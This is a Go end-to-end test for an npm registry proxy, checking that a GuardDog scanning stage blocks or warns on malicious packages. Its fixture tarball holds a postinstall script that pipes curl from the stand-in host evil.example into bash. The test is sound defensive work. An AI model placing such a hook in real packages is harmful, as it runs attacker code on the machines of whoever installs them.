package npm

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"io"
	"log/slog"
	"os/exec"
	"testing"
	"time"

	"github.com/psenna/dependaproxy/internal/config"
	"github.com/psenna/dependaproxy/internal/middleware/mutation"
	"github.com/psenna/dependaproxy/internal/middleware/retrieval/localcache"
	"github.com/psenna/dependaproxy/internal/middleware/validation/guarddog"
	"github.com/psenna/dependaproxy/internal/pipeline"
	"github.com/psenna/dependaproxy/internal/project"
)

// newGuarddogE2EAdapter builds an npmAdapter wired with a memStore + fake
// client + the full pipeline including guarddog-scan (mode from the caller), so
// the e2e test drives the real request/retrieval/validation flow. It mirrors
// newTestAdapterWithGlobal but adds guarddog-scan to the validation chain.
func newGuarddogE2EAdapter(t *testing.T, prefix, dir string, client RegistryClient, store Store, mode string) *npmAdapter {
	t.Helper()
	reg := pipeline.NewRegistry()
	reg.RegisterValidation("min-publication-age", MinPubFactory)
	reg.RegisterValidation("guarddog-scan", guarddog.Factory(nil))
	reg.RegisterRetrieval("local-disk-cache", localcache.Factory)
	reg.RegisterRetrieval("upstream-registry", UpstreamFactory(client))
	reg.RegisterMutation("noop", mutation.Factory)

	validation, err := reg.BuildValidation([]config.Middleware{
		{Type: "min-publication-age", Params: yamlNode("min_days: 0")},
		{Type: "guarddog-scan", Params: yamlNode("mode: " + mode)},
	})
	if err != nil {
		t.Fatal(err)
	}
	retrieval, err := reg.BuildRetrieval([]config.Middleware{
		{Type: "local-disk-cache", Params: yamlNode("path: " + dir)},
		{Type: "upstream-registry"},
	})
	if err != nil {
		t.Fatal(err)
	}
	mp, err := reg.BuildMutation(nil)
	if err != nil {
		t.Fatal(err)
	}
	mp.Chain = []pipeline.MutationMiddleware{mutation.NoOp{}}

	var cache pipeline.Evictor
	if e, ok := retrieval.Head.(pipeline.Evictor); ok {
		cache = e
	}
	global := &project.Resolved{Validation: validation, Retrieval: retrieval, Mutation: mp, Cache: cache}
	resolver := project.NewResolver("npm", reg, fakeProjectStore{}, global)
	return &npmAdapter{
		prefix:   prefix,
		storage:  store,
		client:   client,
		resolver: resolver,
		logger:   slog.New(slog.NewTextHandler(io.Discard, nil)),
		now:      func() time.Time { return time.Now().UTC() },
	}
}

// e2eTarGz builds a minimal gzipped npm tarball in-memory.
func e2eTarGz(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(zw)
	for name, content := range files {
		hdr := &tar.Header{Name: name, Mode: 0o644, Size: int64(len(content)), Typeflag: tar.TypeReg}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte(content)); err != nil {
			t.Fatal(err)
		}
	}
	_ = tw.Close()
	_ = zw.Close()
	return buf.Bytes()
}

// TestGuarddogScanE2E drives the real request/retrieval/validation flow with
// guarddog-scan in the chain: a benign tarball is served (200), a tarball with
// a malicious postinstall is denied (403) in deny mode and served (200) in warn
// mode. It requires the guarddog binary on PATH (not in the CI golang image, so
// it skips there; run it in the built image or a dev env with guarddog).
func TestGuarddogScanE2E(t *testing.T) {
	if _, err := exec.LookPath("guarddog"); err != nil {
		t.Skip("guarddog not installed; skipping guarddog-scan e2e")
	}

	benign := e2eTarGz(t, map[string]string{
		"package/package.json": `{"name":"benign","version":"1.0.0","scripts":{"test":"echo ok"}}`,
		"package/index.js":     "module.exports = 42;",
	})
	malicious := e2eTarGz(t, map[string]string{
		"package/package.json": `{"name":"evil","version":"1.0.0","scripts":{"postinstall":"node -e \"require('child_process').exec('curl http://evil.example/x | bash')\""}}`,
		"package/index.js":     "module.exports = 42;",
	})

	// deny mode: benign served (200) and stored.
	{
		dir := t.TempDir()
		store := newMemStore()
		pack, raw := buildPack(time.Now().AddDate(0, 0, -30), benign)
		client := &rawClient{pack: pack, raw: raw, tarball: benign}
		a := newGuarddogE2EAdapter(t, "/npm", dir, client, store, "deny")
		srv := newTestServer(t, a)

		if code, body := fetchViaProxy(t, srv.URL+"/npm", "testpkg", "1.0.0"); code != 200 || !bytes.Equal(body, benign) {
			t.Fatalf("benign: code=%d body=%d bytes", code, len(body))
		}
		if len(store.recs) != 1 {
			t.Fatalf("benign should be stored, recs=%d", len(store.recs))
		}
	}

	// deny mode: malicious rejected (403), not stored.
	{
		dir := t.TempDir()
		store := newMemStore()
		pack, raw := buildPack(time.Now().AddDate(0, 0, -30), malicious)
		client := &rawClient{pack: pack, raw: raw, tarball: malicious}
		a := newGuarddogE2EAdapter(t, "/npm", dir, client, store, "deny")
		srv := newTestServer(t, a)

		if code, _ := fetchViaProxy(t, srv.URL+"/npm", "testpkg", "1.0.0"); code != 403 {
			t.Fatalf("malicious: code=%d want 403", code)
		}
		if len(store.recs) != 0 {
			t.Fatalf("rejected package must not be stored, recs=%d", len(store.recs))
		}
	}

	// warn mode: malicious served (200).
	{
		dir := t.TempDir()
		store := newMemStore()
		pack, raw := buildPack(time.Now().AddDate(0, 0, -30), malicious)
		client := &rawClient{pack: pack, raw: raw, tarball: malicious}
		a := newGuarddogE2EAdapter(t, "/npm", dir, client, store, "warn")
		srv := newTestServer(t, a)

		if code, body := fetchViaProxy(t, srv.URL+"/npm", "testpkg", "1.0.0"); code != 200 || !bytes.Equal(body, malicious) {
			t.Fatalf("malicious warn: code=%d body=%d bytes", code, len(body))
		}
	}
}
